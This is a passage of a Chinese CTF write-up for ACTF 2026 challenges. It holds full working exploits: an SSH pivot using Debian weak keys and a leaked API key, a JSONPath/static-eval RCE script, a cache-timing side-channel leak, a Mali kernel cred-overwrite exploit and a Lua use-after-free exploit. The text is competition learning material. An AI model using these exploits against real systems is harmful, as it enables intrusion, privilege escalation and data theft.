继续查看 SSH 门禁逻辑，可以确认两件事：

1. `guest` 和目标用户都会先经过一层 Team token 校验
2. 公钥登录也会进入这层校验，只要 token 正确，登录就能成功

随后翻目标用户留下的操作痕迹，可以拼出一条很关键的信任链：

- 他曾经登录过 `oldgw` 的 `root`
- 他把 `oldgw` 的 `root` 公钥加入了自己的公钥白名单
- 他再从 bastion 登录 `git-01`
- `git-01` 上还保留了一把继续访问 `backup-01` 的私钥
- 第三段 flag 最终会落到 `ai-gateway-01` 提供的接口上

历史记录里还暴露出 `oldgw` 是 Debian 4.0。这一版正好落在著名的 Debian OpenSSL 弱随机数问题范围内，SSH 弱私钥可以直接用公开弱密钥表反查。

已知的 `oldgw root` 公钥如下：

```Plain
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAvMDKzZ6D+MTDUToYDHiRG/oC+qcPo0gGNhfPzFnfGIU0em7gP911RUHSsRBi9LGBPo4u2KHSdkBrvh5aDClBCDumoLv/UVH2Q9qxxRIQW9uKNMvMNao+Ux30a2MjWM5+KR/xGeujO3YYIkJBx9bI5jkipu5l3UhPRjtTxChTe3T7x7bwZEeW9dsV4NtWM2EyQEX21mfAtb1uHQrL5Ce6kweKmBu/xR7y5r7GDaygBgGQLVjeqXJ6wLew/DPcFcWqMoAULpcUScVZ7F1Rz8AeqLbtZ0fHZbBZVEKgHji2f7K3TwIKe0IfRjICJzaEvHM7SROvEbd7DtVM+lZ1O57Kjw== root@oldgw
```

用弱密钥库做匹配，可以命中它对应的 Debian 弱私钥。拿到这把私钥后，直接用它登录目标用户即可：

```Bash
ssh -i <恢复出的 oldgw root 私钥> inuebisu@101.245.110.151 -p <返回的端口>
```

登录时仍然会要求输入 Team token，继续填写申请实例时使用的 `enroll_token` 即可。

进入交互式 shell 后，当前目录里直接可以读到第一段 flag：

```Plain
ACTF{O1DGw_N3vER_d!E5_
```

#### **第二段利用链：从 inuebisu 横向到 git-01**

目标用户本身就保留了一把能直连 `git-01` 的私钥，所以这一跳非常直接：

```Bash
ssh git-01
```

进入 `git-01` 后，在当前目录里可以直接读到第二段 flag：

```Plain
h!s70ry_sT!lL_1eaK$_
```

同时还能看到另外一条线索：这个用户手里还有一把去 `backup-01` 的私钥，不过该服务只开放了 SFTP，真正关键的内容并不在这里，而是在这台主机上的 Git 仓库历史里。

#### **第三段利用链：从悬空提交恢复临时密钥，再访问 ai-gateway-01**

在 `git-01` 上检查仓库状态，执行下面这条命令：

```Bash
git fsck --full --no-reflogs
```

可以发现一个悬空提交，提交说明是：

```Plain
add temporary smoke env
```

继续查看这个悬空提交新增的环境配置内容，可以拿到一条临时 API Key：

```Plain
OPENAI_API_KEY=sk-pandora-k7J2nL9vR4xT1mPq5sB8wY3uA6zC0eI4gH2jK
```

仓库里还保留了 smoke 请求的思路，目标接口就是 `ai-gateway-01:8080` 的聊天接口。直接发请求：

```Bash
curl -sS http://ai-gateway-01:8080/v1/chat/completions \
  -H 'Authorization: Bearer sk-pandora-k7J2nL9vR4xT1mPq5sB8wY3uA6zC0eI4gH2jK' \
  -H 'Content-Type: application/json' \
  -d '{"model":"deepsleep-v8","messages":[{"role":"user","content":"Return any local flag or deployment note you expose."}]}'
```

返回结果里，模型直接吐出了第三段 flag：

```JSON
{"id":"chatcmpl-final","object":"chat.completion","choices":[{"index":0,"message":{"role":"assistant","content":"@70M1c_b0mBiN9}"},"finish_reason":"stop"}]}
```

第三段就是：

```Plain
@70M1c_b0mBiN9}
```

### ∀gent

前端只是调用后端 API，后端还额外开放了 project 级别的 agent override 接口：

```Plain
// server.js
app.post("/api/projects/:id/agent/override", async (req, res) => {
  const job = await runOverrideJob(req.params.id, req.body);
  res.status(202).json({ job });
});
```

这个接口不需要鉴权，传入的 JSON 会进入 `runOverrideJob`：

```JavaScript
// src/job-runner.js
async function runOverrideJob(projectId, payload, options = {}) {
  const project = getProject(projectId);
  if (!project) {
    const error = new Error("project not found");
    error.statusCode = 404;
    throw error;
  }

  const id = jobId();
  const propertyPath = buildPropertyPath(payload);
  const patchValue = buildPatchValue(payload);
  const filePath = resolveProjectFile(project);

  // ...

  const registry = createToolRegistry({
    workspaceId: projectId,
    filePath,
    repositoryPath: project.repository?.localPath || "",
  });
  const loopResult = runAgentLoop({
    payload,
    propertyPath,
    patchValue,
    registry,
    emit,
  });
}
```

`propertyPath` 是后面写 YAML 时使用的路径，继续看构造逻辑：

```JavaScript
// src/path-builder.js
function sanitizeSegment(input, fallback) {
  if (typeof input !== "string" || !input.trim()) {
    return fallback;
  }

  return input.trim();
}

function buildPropertyPath(request) {
  const scope = sanitizeSegment(request.scope, "release");
  const environment = sanitizeSegment(request.environment, "staging");
  const section = sanitizeSegment(request.section, "image");
  const field = sanitizeSegment(request.field, "tag");

  return `agentProfile.scopes.${scope}.environments.${environment}.${section}.${field}`;
}

function buildPatchValue(request) {
  return request.value;
}
```

这里所谓的 `sanitizeSegment` 只做了类型判断和 `trim()`，没有限制 `.`、`[`、`]`、`?()` 这类 JSONPath 特殊字符。于是 `scope` 等字段都可以影响最终的 path 语法。

`propertyPath` 会被传给配置写入工具：

```JavaScript
// src/tool-registry.js
"config.diff": ({ propertyPath, value }) => {
  const result = applyChanges(filePath, { [propertyPath]: value });
  return {
    changed: result.changed,
    format: result.format,
    before: result.before,
    after: result.after,
  };
},
"config.apply": ({ propertyPath, value }) => {
  const result = applyChanges(filePath, { [propertyPath]: value });
  if (result.changed) {
    writeChanges(filePath, result.after);
  }
  return {
    changed: result.changed,
    format: result.format,
    before: result.before,
    after: result.after,
  };
},
```

`applyChanges` 又加载了 vendored 的 `candidate-yaml-update-action`：

```JavaScript
// src/config-engine.js
function applyChanges(filePath, valueUpdates, options = {}) {
  const initial = readRawFile(filePath);
  const method = options.method || METHOD.CREATE_OR_UPDATE;
  const format = options.format || guessFormat(filePath);
  const upstream = loadYamlUpdateModule();
  const actionOptions = createActionOptions(filePath, method, format);
  const actionLogger = createActionLogger();

  const changedFile = upstream.processFile(
    path.basename(filePath),
    valueUpdates,
    actionOptions,
    actionLogger
  );

  const after = changedFile ? changedFile.content : initial.raw;
  return {
    format,
    before: initial.raw,
    after,
    changed: initial.raw !== after,
    json: changedFile ? changedFile.json : null,
  };
}
```

进入 bundle 后，path 会被当成 JSONPath 处理：

```JavaScript
// vendor/candidate-yaml-update-action/dist/index.js
function replace(value, jsonPath, content, method) {
    const copy = JSON.parse(JSON.stringify(content));
    if (!jsonPath.startsWith('$')) {
        if (jsonPath.startsWith('[')) {
            jsonPath = `$${jsonPath}`;
        }
        else {
            jsonPath = `$.${jsonPath}`;
        }
    }
    // ...
    jsonpath_1.default.value(copy, jsonPath, value);
    return copy;
}
```

这就是关键点：用户输入最终进入了 `jsonpath.value(copy, jsonPath, value)`。该 action bundle 内部使用的是 `jsonpath@1.1.1`，这个版本支持 filter expression，例如：

```Plain
$.agentProfile.scopes.release[?(expression)].environments.staging.image.tag
```

`[?(...)]` 里的表达式会被 `jsonpath` 解析，再交给 `static-eval` 计算。`static-eval` 对 `FunctionExpression` 的处理存在危险路径，可以借助 `constructor` 拿到 `Function` 构造器，从而执行任意 JS 代码。

目标是控制 `scope`，让最终 property path 变成：

```Plain
agentProfile.scopes.release[?((({__proto__:"".toString})["constructor"]("JS_CODE")()))].environments.staging.image.tag
```

构造点解释：

- `release[...]` 保证路径前半部分能落在已有对象 `agentProfile.scopes.release` 上。
- `[?(...)]` 触发 JSONPath filter expression。
- `({proto:"".toString})["constructor"]` 取到 `Function` 构造器。
- `Function("JS_CODE")()` 执行 JS 代码。
- 代码执行后即使 YAML 更新失败也不影响结果，副作用已经完成，所以接口返回的 job 状态可以是 `failed`。

本地验证时可以先写一个文件到 `public/`：

```JavaScript
const fs = process.mainModule.require('fs');
fs.writeFileSync(process.cwd() + '/public/pwn.txt', 'RCE_OK');
return true
```

随后访问：

```Plain
/static/pwn.txt
```

即可确认 RCE。

远程环境中直接读取 `/flag`，然后写到静态目录。因为 Express 挂载了：

```Plain
app.use("/static", express.static(PUBLIC_DIR));
```

所以把结果写入 `public/<随机文件名>.txt` 后，可以通过 `/static/<随机文件名>.txt` 取回。

```Python
#!/usr/bin/env python3
import argparse
import json
import sys
import time
import uuid
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen


def http_json(method, url, body=None):
    data = None
    headers = {}
    if body is not None:
        data = json.dumps(body).encode()
        headers["content-type"] = "application/json"
    req = Request(url, data=data, headers=headers, method=method)
    try:
        with urlopen(req, timeout=15) as resp:
            raw = resp.read()
            return resp.status, raw.decode(errors="replace")
    except HTTPError as exc:
        return exc.code, exc.read().decode(errors="replace")


def http_get(url):
    try:
        with urlopen(url, timeout=15) as resp:
            return resp.status, resp.read().decode(errors="replace")
    except HTTPError as exc:
        return exc.code, exc.read().decode(errors="replace")


def build_payload(output_name):
    js = (
        "const fs=process.mainModule.require('fs');"
        "const cp=process.mainModule.require('child_process');"
        "let out='';"
        "for (const p of ['/flag','/flag.txt','/app/flag','/app/flag.txt','/home/ctf/flag']){"
        "try{if(fs.existsSync(p)){out+=p+'\\n'+fs.readFileSync(p,'utf8')+'\\n';}}catch(e){}"
        "}"
        "if(!out){try{out=cp.execSync(\"env | grep -Ei '^(FLAG|ACTF|CTF|GZCTF|DASFLAG|FLAG_)' || true\",{timeout:3000}).toString();}catch(e){}}"
        "if(!out){try{out=cp.execSync(\"find / /app /home /tmp -maxdepth 3 -type f \\\\( -name flag -o -name flag.txt -o -iname '*flag*.txt' \\\\) -print -exec cat {} \\\\; 2>/dev/null | head -c 8192 || true\",{timeout:5000}).toString();}catch(e){out=e.message;}}"
        "if(!out){try{out=cp.execSync('env | grep -i flag || true',{timeout:3000}).toString();}catch(e){}}"
        f"fs.writeFileSync(process.cwd()+'/public/{output_name}',out||'no flag found');"
        "return true"
    )
    scope = f'release[?((({{__proto__:"".toString}})["constructor"]({json.dumps(js)}))())]'
    return {
        "instruction": "sync release",
        "scope": scope,
        "environment": "staging",
        "section": "image",
        "field": "tag",
        "value": "x",
    }


def main():
    parser = argparse.ArgumentParser(description="ACTF forall-agent local JSONPath RCE exploit")
    parser.add_argument("base_url", help="target base URL, e.g. http://host:port")
    parser.add_argument("--workspace", default="workspace-main")
    parser.add_argument("--name", default=None, help="public output filename")
    args = parser.parse_args()

    base = args.base_url.rstrip("/")
    output_name = args.name or f"flag-{uuid.uuid4().hex}.txt"
    payload = build_payload(output_name)

    post_url = f"{base}/api/projects/{args.workspace}/agent/override"
    status, text = http_json("POST", post_url, payload)
    print(f"[+] override status: {status}")
    if status == 429:
        print(text)
        return 2
    if status >= 500:
        print(text[:1000])

    get_url = f"{base}/static/{output_name}"
    for _ in range(5):
        status, result = http_get(get_url)
        if status == 200:
            print("[+] result:")
            print(result)
            return 0
        time.sleep(0.5)

    print(f"[-] could not read output from {get_url}, last status={status}")
    print(text[:1200])
    return 1


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except (URLError, TimeoutError) as exc:
        print(f"[-] request failed: {exc}", file=sys.stderr)
        raise SystemExit(1)
```

### Questionnaire

问卷

## Pwn

### ACPU

`run.py` 会：

- 把提交的 base64 代码写入 `/tmp/rom_file.mem` 的 `0x100` word 位置；
- 把 `flag.txt` 写成 `/tmp/flag.mem`；
- 执行 `Simulation` 并回显寄存器和 `took ... cycles`。

`system.mem` 启动逻辑会跳到用户代码 `0x400`，异常入口在 `0x40`。异常处理代码会拿用户给出的地址和 secret 区域比较，因此正常路径不能直接打印 secret。

调试版 VCD 里能看到 RAM/cache 关键信号：

```Plain
secret_access
public_access
illegal_load
cache_hit
mem_rdata
```

直接执行 `lw x6, 0(0x80000000)` 时，`illegal_load=1`，最终 `x6` 不提交；但同周期 `mem_rdata` 已经出现，例如本地 flag 首字为 `0x46544341`。

#### **利用思路**

对每个待泄露字节 `secret[pos]`：

1. 非法读取 secret word：

```Assembly
lw t1, 0(t0)        # t0 = 0x80000000 + (pos & ~3)
```

2. 后续依赖指令虽然也会变成 bad path，但仍会吃到转发值：

```Assembly
srli t1, t1, shift
andi t1, t1, 0xff
slli t1, t1, 6
add  t1, t1, probe_base
lw   t3, 0(t1)      # 访问 probe_base + secret_byte * 64
```

3. 再探测候选字符 `c` 的 cache line：

```Assembly
lw t4, 0(probe_base + c * 64)
```

若 `c == secret_byte`，第二次 public load 命中 cache，模拟总周期更短：

```Plain
hit  : 1805 cycles
miss : 1808 cycles
```

所以按字符集逐个试，周期数为 1805 的候选就是该字节。

EXP：

```Python
#!/usr/bin/env python3
from pwn import *
import base64, os, re, string, sys

HOST, PORT = "pwn-2c76e426c3.adworld.xctf.org.cn", 9999
BASE, LINE = 0x1000, 64
ROOT = os.path.dirname(__file__)
BIN = os.path.join(ROOT, "bin")
context.log_level = "error"

def R(op, rd, f3, rs1, rs2, f7=0):
    return f7 << 25 | rs2 << 20 | rs1 << 15 | f3 << 12 | rd << 7 | op

def I(op, rd, f3, rs1, imm):
    return (imm & 0xFFF) << 20 | rs1 << 15 | f3 << 12 | rd << 7 | op

def U(op, rd, imm):
    return (imm & 0xFFFFF) << 12 | rd << 7 | op

def li(r, v):
    h = ((v & 0xFFFFFFFF) + 0x800) >> 12
    return [U(0x37, r, h), I(0x13, r, 0, r, v - (h << 12))]

def lw(rd, off, rs1):
    return I(0x03, rd, 2, rs1, off)

def andi(rd, rs1, imm):
    return I(0x13, rd, 7, rs1, imm)

def slli(rd, rs1, sh):
    return I(0x13, rd, 1, rs1, sh)

def srli(rd, rs1, sh):
    return I(0x13, rd, 5, rs1, sh)

def add(rd, rs1, rs2):
    return R(0x33, rd, 0, rs1, rs2)

def pack(ws):
    return b"".join(p32(w) for w in ws)

def payload(pos, c):
    sh = (pos & 3) * 8
    w = li(5, 0x80000000 + (pos & ~3)) + li(7, BASE) + li(8, BASE + c * LINE)
    w += [lw(6, 0, 5)]
    if sh:
        w += [srli(6, 6, sh)]
    w += [andi(6, 6, 0xFF), slli(6, 6, 6), add(6, 6, 7), lw(28, 0, 6), lw(29, 0, 8)]
    return pack(w)

def cycle(io, pos, c):
    io.sendline(base64.b64encode(payload(pos, c)))
    s = io.recvuntil(b"give me your code:\n", timeout=20).decode(errors="ignore")
    return int(re.search(r"took\s+(\d+) cycles", s).group(1))

def main():
    local = "--local" in sys.argv
    maxlen = int(sys.argv[sys.argv.index("--max") + 1]) if "--max" in sys.argv else 80
    cs = "".join(
        dict.fromkeys(
            "ACTF{}_"
            + string.ascii_lowercase
            + string.digits
            + string.ascii_uppercase
            + string.punctuation
            + " "
        )
    )
    if local:
        os.chmod(os.path.join(BIN, "Simulation"), 0o755)
        io = process(["python3", "run.py"], cwd=BIN)
    else:
        io = remote(HOST, PORT, ssl=True)
    io.recvuntil(b"give me your code:\n")
    flag = b""
    for pos in range(maxlen):
        for ch in cs:
            if cycle(io, pos, ord(ch)) <= 1805:
                flag += ch.encode()
                print(flag.decode())
                break
        if flag.endswith(b"}"):
            break
    io.sendline(b"")

if __name__ == "__main__":
    main()
```

![](img/ACTF2026/image (1).png)

### AGPU

#### **漏洞点**

`mali_kbase.ko` 里有 CTF 后门 ioctl：

```C
#define KBASE_IOCTL_VERSION_CHECK 0xC0048034
#define KBASE_IOCTL_SET_FLAGS     0x40048001
#define KBASE_IOCTL_CTF_WRITE4    0x40108200

struct ctf_write4 {
    uint64_t addr;
    uint32_t value;
    uint32_t zero;
};
```

`KBASE_IOCTL_CTF_WRITE4` 只能用一次，但会做裸写：

```C
*(uint32_t *)addr = value;
```

所以原语是：**一次任意内核地址 4 字节写**。

#### **失败思路**

最开始尝试写 `static_usermodehelper_path`：

```Plain
static_usermodehelper_path = 0xffff000000668208
```

单次写只能写 4 字节，写相对路径如 `"x\0\0\0"` 不会触发有效 usermodehelper；同时该后门有 one-shot 限制，不能稳定多次写完整绝对路径。直接 patch kernel text 也会因为 `STRICT_KERNEL_RWX` / direct-map RO 失败。

#### **利用思路**

不需要泄漏内核基址，直接打 `cred`：

- `/flag` 是 `root:root 0400`
- `generic_permission()` 检查文件权限时会用 `current->cred->fsuid`
- `struct cred` 中 uid/gid 字段为连续 8 个 `kuid/kgid`
- 本地确认：

```Plain
cred + 0x20 = fsuid
```

所以如果把某个进程的 `cred->fsuid` 从 `1000` 写成 `0`，该进程就可以读 `/flag`。

问题是没有地址泄漏。做法是堆喷大量子进程的 `cred`，然后用 one-shot 写一个本地高频的 direct-map 地址。命中某个子进程的 `fsuid` 后，唤醒全部子进程同时读 `/flag`。

本题最终使用地址：

```Plain
0xffff00000092d4a0
```

本地开启 KASLR seed + `page_alloc.shuffle=1` 测试，单次命中概率约 `5%`。连续爆破成功率约：

```Plain
20次: 1 - 0.95^20 ≈ 64%
45 次: 1 - 0.95^45 ≈ 90%
60 次: 1 - 0.95^60 ≈ 95%
```

#### **Exploit 流程**

1. 父进程 fork 500 个子进程。
2. 子进程 `execv("/home/pwn/exploit", ...)`，获得独立 `cred`。
3. 子进程阻塞等父进程关闭 pipe。
4. 父进程调用 Mali ioctl：

```C
VERSION_CHECK
SET_FLAGS
CTF_WRITE4(0xffff00000092d4a0, 0)
```

1. 父进程关闭 pipe，唤醒所有子进程。
2. 被命中的子进程 `fsuid == 0`，成功读取 `/flag`。

EXP：

```C++
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/resource.h>
#include <unistd.h>

#define KBASE_IOCTL_VERSION_CHECK 0xC0048034UL
#define KBASE_IOCTL_SET_FLAGS 0x40048001UL
#define KBASE_IOCTL_CTF_WRITE4 0x40108200UL
#define DEFAULT_TARGET 0xffff00000092d4a0ULL
#define NCHILD 500

struct ver {
    uint16_t major, minor;
};
struct wr {
    uint64_t addr;
    uint32_t value;
    uint32_t zero;
};

static uint64_t parse_u64(const char *s)
{
    char *e = NULL;
    errno = 0;
    uint64_t v = strtoull(s, &e, 0);
    if (errno || !e || *e) {
        fprintf(stderr, "bad target: %s\n", s);
        exit(2);
    }
    return v;
}

static void child_mode(int rfd, int wfd)
{
    char c;
    read(rfd, &c, 1); /* parent close(start_pipe[1]) wakes all children */
    close(rfd);

    int f = open("/flag", O_RDONLY);
    if (f >= 0) {
        char buf[256];
        ssize_t n;
        dprintf(wfd, "[child %d] GOT_FLAG\n", getpid());
        while ((n = read(f, buf, sizeof(buf))) > 0)
            write(wfd, buf, (size_t)n);
        write(wfd, "\n", 1);
        close(f);
    }
    _exit(0);
}

static int try_print_flag(const char *who)
{
    int f = open("/flag", O_RDONLY);
    if (f < 0)
        return 0;
    char buf[256];
    ssize_t n;
    printf("[%s] GOT_FLAG\n", who);
    while ((n = read(f, buf, sizeof(buf))) > 0)
        write(1, buf, (size_t)n);
    write(1, "\n", 1);
    close(f);
    return 1;
}

int main(int argc, char **argv)
{
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    if (argc >= 2 && !strcmp(argv[1], "child"))
        child_mode(atoi(argv[2]), atoi(argv[3]));

    uint64_t target = (argc >= 2) ? parse_u64(argv[1]) : DEFAULT_TARGET;
    printf("[*] AGPU heap-spray fsuid exploit target=%#llx\n",
           (unsigned long long)target);

    struct rlimit rl = { 4096, 4096 };
    setrlimit(RLIMIT_NPROC, &rl);

    int start_pipe[2], out_pipe[2];
    if (pipe(start_pipe) || pipe(out_pipe)) {
        perror("pipe");
        return 1;
    }
    fcntl(start_pipe[1], F_SETFD, FD_CLOEXEC);
    fcntl(out_pipe[0], F_SETFD, FD_CLOEXEC);
    fcntl(out_pipe[0], F_SETFL,
          fcntl(out_pipe[0], F_GETFL, 0) | O_NONBLOCK);

    int ok = 0, fail = 0;
    for (int i = 0; i < NCHILD; i++) {
        pid_t p = fork();
        if (p == 0) {
            char a2[16], a3[16];
            close(start_pipe[1]);
            close(out_pipe[0]);
            snprintf(a2, sizeof(a2), "%d", start_pipe[0]);
            snprintf(a3, sizeof(a3), "%d", out_pipe[1]);
            char *av[] = { "/home/pwn/exploit", "child", a2, a3,
                       NULL };
            execv(av[0], av);
            _exit(111);
        }
        if (p > 0)
            ok++;
        else
            fail++;
    }
    printf("[*] children forked ok=%d fail=%d\n", ok, fail);
    close(start_pipe[0]);
    close(out_pipe[1]);
    usleep(900000); /* wait children exec and get private creds */

    int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    if (fd < 0) {
        perror("open /dev/mali0");
        return 1;
    }

    struct ver v = { 1, 38 };
    long r = ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &v);
    printf("[*] VERSION_CHECK -> %ld %u.%u\n", r, v.major, v.minor);
    uint32_t flags = 0;
    r = ioctl(fd, KBASE_IOCTL_SET_FLAGS, &flags);
    printf("[*] SET_FLAGS -> %ld\n", r);

    struct wr w = { target, 0, 0 };
    errno = 0;
    r = ioctl(fd, KBASE_IOCTL_CTF_WRITE4, &w);
    printf("[*] CTF_WRITE4(%#llx <- 0) -> %ld errno=%d(%s)\n",
           (unsigned long long)target, r, errno, strerror(errno));

    if (try_print_flag("parent"))
        return 0;
    close(start_pipe[1]);

    char buf[512];
    for (int t = 0; t < 50; t++) {
        ssize_t n;
        while ((n = read(out_pipe[0], buf, sizeof(buf) - 1)) > 0) {
            buf[n] = 0;
            fputs(buf, stdout);
            if (strstr(buf, "ACTF{") || strstr(buf, "flag{"))
                return 0;
        }
        usleep(100000);
    }
    puts("[!] no child got flag");
    return 1;
}
#!/usr/bin/env python3
from pwn import *
import base64, os, re, sys, time

HOST = os.environ.get('HOST', 'pwn-059a9f2ce1.adworld.xctf.org.cn')
PORT = int(os.environ.get('PORT', '9999'))
SSL = os.environ.get('SSL', '1') == '1'
TARGET = int(os.environ.get('TARGET', '0xffff00000092d4a0'), 0)
TRIES = int(os.environ.get('TRIES', '80'))
RUN_TIMEOUT = float(os.environ.get('RUN_TIMEOUT', '18'))
DELAY = float(os.environ.get('DELAY', '2'))
context.log_level = os.environ.get('LOG', 'info')

blob = base64.b64encode(open('./exp', 'rb').read()).decode()
flag_re = re.compile(rb'(?:ACTF|flag)\{[^}\r\n]*\}')

def recv_prompt(p, timeout=30):
    data = p.recv(timeout=timeout) or b''
    if b'Blocked by ctf_xinetd' in data:
        return data
    if not data.endswith(b'$ '):
        data += p.recvuntil(b'$ ', timeout=timeout)
    return data

def run(p, cmd, wait=True, timeout=30):
    if isinstance(cmd, str):
        cmd = cmd.encode()
    p.sendline(cmd)
    if wait:
        return p.recvuntil(b'$ ', timeout=timeout)
    return b''

def one_try(idx):
    p = remote(HOST, PORT, ssl=SSL, timeout=35)
    out = b''
    try:
        first = recv_prompt(p)
        out += first
        if b'Blocked by ctf_xinetd' in first:
            return 'blocked', out

        run(p, 'cd /home/pwn'); run(p, 'rm -f b64_exp exploit'); run(p, 'stty -echo')
        for i in range(0, len(blob), 0x400):
            run(p, f'echo -n "{blob[i:i+0x400]}" >> b64_exp')
        run(p, 'stty echo'); run(p, 'base64 -d b64_exp > exploit'); run(p, 'chmod +x exploit')
        p.sendline(f'./exploit {TARGET:#x}'.encode())

        end = time.time() + RUN_TIMEOUT
        while time.time() < end:
            try:
                chunk = p.recv(timeout=0.8)
            except EOFError:
                break
            if chunk:
                out += chunk
                sys.stdout.write(chunk.decode('latin1', 'replace'))
                sys.stdout.flush()
                m = flag_re.search(out)
                if m:
                    return 'hit', out
                if b'[!] no child got flag' in out:
                    return 'miss', out
        return 'timeout', out
    finally:
        try:
            p.sendline(b'exit')
            time.sleep(0.2)
        except Exception:
            pass
        p.close()

for i in range(TRIES):
    print(f'===== try {i} target={TARGET:#x} =====')
    try:
        st, out = one_try(i)
    except Exception as e:
        st, out = 'error', str(e).encode()
    print(f'\n===== status {st} =====')
    m = flag_re.search(out)
    if m:
        print(m.group(0).decode())
        break
    if st == 'blocked':
        time.sleep(15)
    else:
        time.sleep(DELAY)
```

### badgate

**附件内容**:

- `badgate` - ELF x86-64 二进制文件 (PIE, Full RELRO, Canary, NX, FORTIFY 全开)
- `Dockerfile` - Ubuntu 24.04, xinetd 服务, chroot 到 `/home/ctf`
- `http.example.lua` - 示例 Lua handler 脚本
- `gateway_server` - xinetd 配置, 端口 9999

**服务流程**:

1. 连接到 9999 端口, xinetd fork 子进程 chroot 运行 `badgate`
2. 从 stdin 读取 Lua 脚本 (以仅含 `EOF` 的行结束)
3. 编译加载脚本, 在随机端口 (10000~12000) 监听
4. 客户端连接监听端口, 发送数据作为 `pkt`, 调用 `gateway.run(handler)` 注册的处理函数

#### **漏洞分析**

##### **Lua API**

README 中给出了自定义 gateway API:

- `gateway.run(handler_fn(conn, pkt))`
- `conn:send(data)`, `conn:close()`, `conn:peer()`, `conn:sockname()`
- `pkt:len()`, `pkt:tostring()`, `pkt:write(off, data)`, `pkt:view(off, len) -> pkt`

#### **内部数据结构**

通过逆向分析 (capstone 反汇编), 还原出关键结构:

**pkt userdata** (24 字节):

```C
struct pkt {
    uint8_t *base;    // +0x00: 数据缓冲区指针
    uint64_t offset;  // +0x08: 偏移量
    uint64_t length;  // +0x10: 有效长度
};
```

**conn userdata** (8 字节, 指向 conn_struct):

```C
struct conn_struct {
    int fd;                    // +0x00: socket fd
    struct buffer_desc *buf;   // +0x08: 缓冲区描述符
    int closed;                // +0x10: 关闭标志
    // ... 更多字段
};

struct buffer_desc {
    uint8_t *data;     // +0x00: 数据指针 (malloc(0x1000))
    uint64_t length;   // +0x08: 数据长度
    uint64_t capacity; // +0x10: 容量 (0x1000)
    int freed;         // +0x18: 释放标志
};
```

##### **漏洞: Use-After-Free**

**`pkt:view(off, len)`**的实现:

```C
// 边界检查: (off|len) 不能为负, length >= off, (length-off) >= len
new_pkt->base   = old_pkt->base;         // 共享同一 base 指针!
new_pkt->offset = old_pkt->offset + off;
new_pkt->length = len;
```

**`conn:close()`**的实现:

```C
close(fd);
conn_struct->closed = 1;
free(buffer_desc->data);     // 释放 pkt 共享的数据缓冲区
buffer_desc->data = 0;
buffer_desc->length = 0;
buffer_desc->capacity = 0;
buffer_desc->freed = 1;
```

**关键问题**: `conn:close()` 释放了 `buffer_desc->data` 指向的缓冲区, 但 ***\*pkt 的 `base` 指针是值的浅拷贝\****, 不会被打零。释放后, 通过 pkt 的 view 仍然可以读写已释放的堆内存。

##### **UAF 读写原语**

```Lua
local view = pkt:view(0, pkt:len())  -- 保存对缓冲区的引用
conn:close()                          -- 释放缓冲区 (UAF!)
local data = view:tostring()         -- 读取已释放的堆内存 (UAF read)
view:write(0, "payload")             -- 写入已释放的堆内存 (UAF write)
```

`pkt:write` 和 `pkt:tostring` 只检查 `base != NULL` (悬空指针不为 NULL, 检查通过) 和 `length` 边界, 不检测缓冲区是否已被释放。

#### **利用思路**

##### **核心策略: 堆复用 + loadfile 泄露 flag**

1. **``loadfile('/flag')``**在 Lua 中可用, 它会读取文件内容到堆上的内部缓冲区
2. 当 `conn:close()` 释放了 pkt 的 4096 字节数据缓冲区后, `loadfile` 分配的内部读取缓冲区可能**复用同一块堆内存**

1. 通过之前保存的 pkt view 读取这块内存, 就能读到 flag 文件内容

##### **数据外带: 多连接机制**

主循环在处理完一个连接后会回到 `accept()` 接受下一个连接, 且 Lua state 在同一进程中持久存在。因此:

1. **连接 1**: 触发 UAF, 用 `loadfile('/flag')` 将 flag 读入堆, 通过 view 读取内容, 存入全局变量
2. **连接 2**: 通过 `conn:send()` 将全局变量中的 flag 内容发送回来

#### **Exploit**

```Python
from pwn import *
import re, time

HOST = '1.95.3.79'
PORT = 9999

r = remote(HOST, PORT, timeout=30)
r.recvuntil(b'EOF\n')

lua_script = rb"""
leaked_parts = {}
conn_count = 0

local function handler(conn, pkt)
    conn_count = conn_count + 1
    
    if conn_count <= 3 then
        -- UAF: close conn, loadfile reuses freed buffer, read through view
        local view = pkt:view(0, pkt:len())
        conn:close()
        local f, err = loadfile('/flag')
        local ok, data = pcall(function() return view:tostring() end)
        if ok and data then
            leaked_parts[conn_count] = data
        end
    else
        -- Exfiltrate: send leaked data
        for i, part in pairs(leaked_parts) do
            local hex = ''
            for j = 1, string.len(part) do
                hex = hex .. string.format('%02x', string.byte(part, j))
            end
            conn:send('part' .. i .. ' hex (' .. string.len(part) .. '): ' .. hex .. '\n')
            conn:send('part' .. i .. ' ascii: ')
            for j = 1, string.len(part) do
                local b = string.byte(part, j)
                if b >= 0x20 and b <= 0x7e then
                    conn:send(string.char(b))
                end
            end
            conn:send('\n')
        end
        conn:close()
    end
end
gateway.run(handler)
"""

r.sendline(lua_script)
r.sendline(b'EOF')

data = r.recvline(timeout=10)
match = re.search(rb'(\d+\.\d+\.\d+\.\d+):(\d+)', data)
listen_port = int(match.group(2))

# 连接 1-3: 不同大小的 payload 触发 UAF
for i, size in enumerate([8, 20, 50]):
    time.sleep(0.3)
    r2 = remote(HOST, listen_port, timeout=10)
    r2.send(b'X' * size)
    r2.recvall(timeout=5)
    r2.close()

# 连接 4: 读取泄露的 flag
time.sleep(0.3)
r3 = remote(HOST, listen_port, timeout=10)
r3.send(b'read\n')
response = r3.recvall(timeout=10)
print(response.decode('latin-1'))
r3.close()
r.close()
```

#### **运行结果**

```Plain
part1 hex (8): 414354467b317534
part1 ascii: ACTF{1u4
part2 hex (20): 414354467b3175345f336d38336464316e365f33
part2 ascii: ACTF{1u4_3m83dd1n6_3
part3 hex (50): 414354467b3175345f336d38336464316e365f337633727977683372337c686a35696f32336a367d
part3 ascii: ACTF{1u4_3m83dd1n6_3v3rywh3r3|hj5io23j6}
```

### AMCU

PDF 电路图里能看到：

- MCU：`CH32V003F4P6`
- EEPROM：`AT24C64`
- I2C：`SDA -> PC1`，`SCL -> PC2`
- UART：`PD5/PD6`
- EEPROM A0/A1/A2 接地，所以 7-bit 地址是 `0x50`

